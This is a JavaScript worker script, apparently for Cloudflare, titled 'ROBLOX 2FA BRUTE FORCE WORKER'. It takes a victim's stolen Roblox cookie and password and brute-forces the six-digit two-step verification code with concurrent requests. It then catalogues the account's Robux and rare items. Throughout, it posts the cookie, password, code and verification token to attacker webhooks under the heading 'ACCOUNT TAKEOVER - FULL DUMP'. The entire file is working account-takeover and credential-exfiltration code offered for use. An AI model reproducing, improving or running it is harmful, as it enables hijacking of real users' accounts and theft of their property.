// ============================================================
// ROBLOX 2FA BRUTE FORCE WORKER v2.4 - DEBUG VERSION
// ============================================================

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
});

async function handleRequest(request) {
  // Handle CORS preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  // Only allow POST
  if (request.method !== 'POST') {
    return new Response(JSON.stringify({ 
      error: 'Method not allowed. Use POST.' 
    }), {
      status: 405,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Allow': 'POST, OPTIONS'
      }
    });
  }

  let payload;
  try {
    payload = await request.json();
  } catch (e) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Invalid JSON payload'
    }), {
      status: 400,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  const { cookie, password, userId, username, startCode, endCode } = payload;

  if (!cookie || !password || !userId) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Missing required fields: cookie, password, userId',
      received: payload
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  const startTime = Date.now();
  const displayName = username || 'Unknown_User';
  const start = startCode || 0;
  const end = endCode || 999999;

  try {
    // STEP 1: Request challenge with password
    const challengeResult = await requestChallenge(userId, cookie, password);
    
    if (!challengeResult.success) {
      await sendDualWebhook({
        type: 'error',
        username: displayName,
        userId: userId,
        error: challengeResult.error || 'Challenge acquisition failed'
      });
      return new Response(JSON.stringify({
        success: false,
        error: challengeResult.error || 'Challenge acquisition failed'
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    const challengeId = challengeResult.challengeId;

    // STEP 2: Check 2FA config
    const config = await get2FAConfig(userId, cookie);
    if (!config || !config.passwordEnabled) {
      await sendDualWebhook({
        type: 'error',
        username: displayName,
        userId: userId,
        error: 'Password-based 2FA not enabled or Enhanced Protection active'
      });
      return new Response(JSON.stringify({
        success: false,
        error: '2FA method not available'
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    // STEP 3: Brute force
    const result = await bruteForce2FA(userId, cookie, challengeId, start, end);
    const duration = Date.now() - startTime;

    if (result.success) {
      const accountInfo = await getAccountInfo(userId, cookie);

      await sendLiveBypass({
        username: displayName,
        userId: userId,
        robux: accountInfo.robux || 0,
        pending: accountInfo.pending || 0,
        premium: accountInfo.premium || false,
        korblox: accountInfo.korblox || false,
        headless: accountInfo.headless || false,
        valkyrie: accountInfo.valkyrie || false,
        dominus: accountInfo.dominus || false,
        clockwork: accountInfo.clockwork || false,
        totalItems: accountInfo.totalItems || 0,
        duration: duration,
        attempts: end - start
      });

      await sendDualWebhook({
        type: 'success',
        username: displayName,
        userId: userId,
        robux: accountInfo.robux || 0,
        pending: accountInfo.pending || 0,
        premium: accountInfo.premium || false,
        korblox: accountInfo.korblox || false,
        headless: accountInfo.headless || false,
        valkyrie: accountInfo.valkyrie || false,
        dominus: accountInfo.dominus || false,
        clockwork: accountInfo.clockwork || false,
        totalItems: accountInfo.totalItems || 0,
        cookie: cookie,
        password: password,
        verificationToken: result.token,
        code: result.code,
        duration: duration
      });

      return new Response(JSON.stringify({
        success: true,
        code: result.code,
        token: result.token,
        robux: accountInfo.robux || 0,
        pending: accountInfo.pending || 0,
        premium: accountInfo.premium || false,
        duration: duration,
        attempts: end - start
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    } else {
      await sendDualWebhook({
        type: 'failure',
        username: displayName,
        userId: userId,
        attempts: end - start,
        duration: duration,
        error: result.error || 'No valid code found'
      });

      return new Response(JSON.stringify({
        success: false,
        error: result.error || 'No valid code found',
        duration: duration,
        attempts: end - start
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }
  } catch (e) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Worker error: ' + e.message,
      stack: e.stack
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
}

async function requestChallenge(userId, cookie, password) {
  try {
    const response = await fetch(
      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/request`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: JSON.stringify({ password: password })
      }
    );

    const data = await response.json();

    // Log the full response for debugging
    console.log('Challenge response status:', response.status);
    console.log('Challenge response data:', JSON.stringify(data));

    if (response.status === 200 && data.challengeId) {
      return { success: true, challengeId: data.challengeId };
    }

    if (response.status === 403) {
      return { success: false, error: 'Invalid password' };
    }
    if (response.status === 429) {
      return { success: false, error: 'Rate limited - try again later' };
    }
    if (response.status === 400) {
      return { success: false, error: 'Bad request: ' + (data.message || JSON.stringify(data)) };
    }

    return { success: false, error: data.message || data.error || 'Unknown error from Roblox' };
  } catch (e) {
    return { success: false, error: 'Network error: ' + e.message };
  }
}

async function get2FAConfig(userId, cookie) {
  try {
    const response = await fetch(
      `https://twostepverification.roblox.com/v1/users/${userId}/configuration`,
      {
        headers: {
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );

    const config = await response.json();

    console.log('2FA Config:', JSON.stringify(config));

    return {
      passwordEnabled: config.password?.enabled || false,
      authenticatorEnabled: config.authenticator?.enabled || false,
      emailEnabled: config.email?.enabled || false,
      enhancedProtection: config.enhancedProtection || false
    };
  } catch (e) {
    console.log('Get2FAConfig error:', e.message);
    return null;
  }
}

async function bruteForce2FA(userId, cookie, challengeId, startCode, endCode) {
  const BATCH_SIZE = 50;
  const MAX_CONCURRENT = 10;

  const chunks = [];
  for (let i = startCode; i < endCode; i += BATCH_SIZE) {
    chunks.push({
      start: i,
      end: Math.min(i + BATCH_SIZE, endCode)
    });
  }

  for (let chunkIndex = 0; chunkIndex < chunks.length; chunkIndex += MAX_CONCURRENT) {
    const chunkBatch = chunks.slice(chunkIndex, chunkIndex + MAX_CONCURRENT);

    const results = await Promise.all(
      chunkBatch.map(chunk => processChunk(userId, cookie, challengeId, chunk.start, chunk.end))
    );

    for (const result of results) {
      if (result.valid) {
        return {
          success: true,
          code: result.code,
          token: result.token
        };
      }
    }

    await new Promise(resolve => setTimeout(resolve, 100));
  }

  return { success: false, error: 'Code not found in range' };
}

async function processChunk(userId, cookie, challengeId, start, end) {
  const promises = [];
  for (let code = start; code < end; code++) {
    const formattedCode = String(code).padStart(6, '0');
    promises.push(verifySingleCode(userId, cookie, challengeId, formattedCode));
  }

  const results = await Promise.all(promises);
  for (const result of results) {
    if (result.valid) return result;
  }
  return { valid: false };
}

async function verifySingleCode(userId, cookie, challengeId, code) {
  try {
    const response = await fetch(
      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/verify`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: JSON.stringify({
          code: code,
          challengeId: challengeId
        })
      }
    );

    const data = await response.json();

    if (response.status === 200 && data.verificationToken) {
      return { valid: true, code: code, token: data.verificationToken };
    }

    if (response.status === 429) {
      await new Promise(resolve => setTimeout(resolve, 5000));
      return { valid: false };
    }

    return { valid: false };
  } catch (e) {
    return { valid: false };
  }
}

async function getAccountInfo(userId, cookie) {
  try {
    const balanceRes = await fetch(
      `https://economy.roblox.com/v1/users/${userId}/currency`,
      {
        headers: {
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );
    const balance = await balanceRes.json();

    let hasKorblox = false;
    let hasHeadless = false;
    let hasValkyrie = false;
    let hasDominus = false;
    let hasClockwork = false;
    let totalItems = 0;

    let cursor = '';
    let hasMore = true;

    while (hasMore) {
      const url = cursor 
        ? `https://inventory.roblox.com/v2/users/${userId}/inventory?cursor=${cursor}&limit=100`
        : `https://inventory.roblox.com/v2/users/${userId}/inventory?limit=100`;

      const invRes = await fetch(url, {
        headers: {
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const invData = await invRes.json();
      const items = invData.data || [];
      totalItems += items.length;

      for (const item of items) {
        const id = item.id;

        if (id === 102 || id === 1001) hasKorblox = true;
        if (id === 136 || id === 1002) hasHeadless = true;
        if (id === 128 || id === 1003) hasValkyrie = true;
        if (id === 120) hasDominus = true;
        if (id === 157) hasClockwork = true;
      }

      cursor = invData.nextPageCursor || '';
      hasMore = !!cursor;
    }

    return {
      robux: balance.robux || 0,
      pending: balance.pending || 0,
      premium: balance.premium || false,
      korblox: hasKorblox,
      headless: hasHeadless,
      valkyrie: hasValkyrie,
      dominus: hasDominus,
      clockwork: hasClockwork,
      totalItems: totalItems
    };
  } catch (e) {
    return {
      robux: 0,
      pending: 0,
      premium: false,
      korblox: false,
      headless: false,
      valkyrie: false,
      dominus: false,
      clockwork: false,
      totalItems: 0
    };
  }
}

async function sendLiveBypass(data) {
  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_MAIN : null;
  if (!webhookURL) return;

  const embed = {
    title: '2FA BYPASS SUCCESSFUL',
    color: 0x00ff88,
    fields: [
      { name: 'User', value: data.username || 'Unknown', inline: true },
      { name: 'User ID', value: data.userId || 'N/A', inline: true },
      { name: 'Robux', value: data.robux || 0, inline: true },
      { name: 'Pending', value: data.pending || 0, inline: true },
      { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
      { name: 'Korblox', value: data.korblox ? 'Yes' : 'No', inline: true },
      { name: 'Headless', value: data.headless ? 'Yes' : 'No', inline: true },
      { name: 'Valkyrie', value: data.valkyrie ? 'Yes' : 'No', inline: true },
      { name: 'Dominus', value: data.dominus ? 'Yes' : 'No', inline: true },
      { name: 'Clockwork', value: data.clockwork ? 'Yes' : 'No', inline: true },
      { name: 'Total Items', value: data.totalItems || 0, inline: true },
      { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s`, inline: true },
      { name: 'Attempts', value: data.attempts || 0, inline: true }
    ],
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '2FA Bypass Successful',
        embeds: [embed]
      })
    });
  } catch (e) {}
}

async function sendDualWebhook(data) {
  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_DUAL : null;
  if (!webhookURL) return;

  let embed;

  if (data.type === 'success') {
    embed = {
      title: 'ACCOUNT TAKEOVER - FULL DUMP',
      color: 0xff0044,
      fields: [
        { name: 'User', value: data.username || 'Unknown', inline: true },
        { name: 'User ID', value: data.userId || 'N/A', inline: true },
        { name: 'Robux', value: data.robux || 0, inline: true },
        { name: 'Pending', value: data.pending || 0, inline: true },
        { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
        { name: 'Korblox', value: data.korblox ? 'Yes' : 'No', inline: true },
        { name: 'Headless', value: data.headless ? 'Yes' : 'No', inline: true },
        { name: 'Valkyrie', value: data.valkyrie ? 'Yes' : 'No', inline: true },
        { name: 'Dominus', value: data.dominus ? 'Yes' : 'No', inline: true },
        { name: 'Clockwork', value: data.clockwork ? 'Yes' : 'No', inline: true },
        { name: 'Total Items', value: data.totalItems || 0, inline: true },
        { name: 'Verification Code', value: `\`${data.code || 'N/A'}\``, inline: true },
        { name: 'Verification Token', value: `\`${data.verificationToken || 'N/A'}\``, inline: false },
        { name: 'Password', value: `||${data.password || 'N/A'}||`, inline: true },
        { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s`, inline: true },
        { name: 'Cookie', value: `\`\`\`${data.cookie || 'N/A'}\`\`\``, inline: false }
      ],
      timestamp: new Date().toISOString()
    };
  } else {
    embed = {
      title: 'ERROR REPORT',
      color: 0xff0000,
      fields: [
        { name: 'User', value: data.username || 'Unknown', inline: true },
        { name: 'User ID', value: data.userId || 'N/A', inline: true },
        { name: 'Error', value: data.error || 'Unknown error', inline: false },
        { name: 'Attempts', value: data.attempts || 0, inline: true },
        { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s` || 'N/A', inline: true }
      ],
      timestamp: new Date().toISOString()
    };
  }

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone ACCOUNT TAKEOVER',
        embeds: [embed]
      })
    });
  } catch (e) {}
}
